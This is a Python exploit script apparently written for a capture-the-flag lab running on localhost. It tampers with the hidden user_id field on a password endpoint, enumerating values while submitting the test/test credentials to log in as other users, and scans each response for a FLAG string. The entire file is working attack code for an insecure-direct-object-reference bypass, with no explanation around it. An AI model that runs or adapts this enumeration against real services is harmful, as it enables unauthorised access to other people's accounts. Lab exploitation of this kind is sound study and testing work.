import requests
import re

BASE_URL = "http://127.0.0.1:32883"
PASSWORD_TEST_URL = f"{BASE_URL}/password/test"
DASHBOARD_URL = f"{BASE_URL}/dashboard"

print("[*] Exploiting user_id parameter in /password/test\n")
print("[+] The form has hidden fields: username=test, user_id=10032")
print("[+] Strategy: POST with correct password but manipulated user_id\n")

# Test different user_ids with the correct password
test_user_ids = list(range(1, 101)) + list(range(9990, 10050)) + [0, -1, 99999, 100000]

print(f"[*] Testing {len(test_user_ids)} different user_id values\n")

successful_auths = []
flags_found = []

for i, user_id in enumerate(test_user_ids):
    if (i + 1) % 50 == 0:
        print(f"[PROGRESS] Tested {i+1}/{len(test_user_ids)} user_ids, {len(successful_auths)} successful")
    
    # Create session for each attempt
    session = requests.Session()
    
    # POST with manipulated user_id
    auth_data = {
        'username': 'test',
        'password': 'test',
        'user_id': str(user_id)
    }
    
    try:
        # Authenticate
        auth_resp = session.post(PASSWORD_TEST_URL, data=auth_data, allow_redirects=True, timeout=5)
        
        # Check if we got to dashboard (not login page)
        if auth_resp.status_code == 200:
            # Check content to determine if it's dashboard or login page
            if "Trading Platform</h2>" in auth_resp.text and len(auth_resp.text) > 1100 and len(auth_resp.text) < 1300:
                # This is the login page (length ~1184)
                continue
            elif "Welcome" in auth_resp.text or len(auth_resp.text) != 1184:
                # Different content - potential dashboard
                print(f"\n[+] SUCCESS: user_id={user_id}")
                print(f"    Status: {auth_resp.status_code}")
                print(f"    URL: {auth_resp.url}")
                print(f"    Length: {len(auth_resp.text)}B")
                
                successful_auths.append({
                    'user_id': user_id,
                    'length': len(auth_resp.text),
                    'content': auth_resp.text
                })
                
                # Check for FLAG
                flag_match = re.search(r'FLAG\{[^}]+\}', auth_resp.text)
                if flag_match:
                    flag_value = flag_match.group(0)
                    print(f"\n{'='*60}")
                    print(f"[!] FLAG FOUND at user_id={user_id}")
                    print(f"[!] FLAG: {flag_value}")
                    print(f"{'='*60}")
                    print(f"\n[+] Full Response:")
                    print(auth_resp.text)
                    print(f"\n{'='*60}\n")
                    
                    flags_found.append({
                        'user_id': user_id,
                        'flag': flag_value
                    })
                    
                    # Stop on first flag
                    break
                else:
                    print(f"    Content snippet: {auth_resp.text[:400]}")
    
    except Exception as e:
        pass

# Summary
print(f"\n{'='*60}")
print(f"[SUMMARY]")
print(f"Total tested: {len(test_user_ids)}")
print(f"Successful authentications: {len(successful_auths)}")
print(f"Flags found: {len(flags_found)}")

if successful_auths:
    print(f"\n[+] Valid user_ids with different content:")
    for auth in successful_auths:
        print(f"    user_id={auth['user_id']}: {auth['length']}B")

if flags_found:
    print(f"\n[!] FLAGS:")
    for flag_info in flags_found:
        print(f"    user_id={flag_info['user_id']}: {flag_info['flag']}")

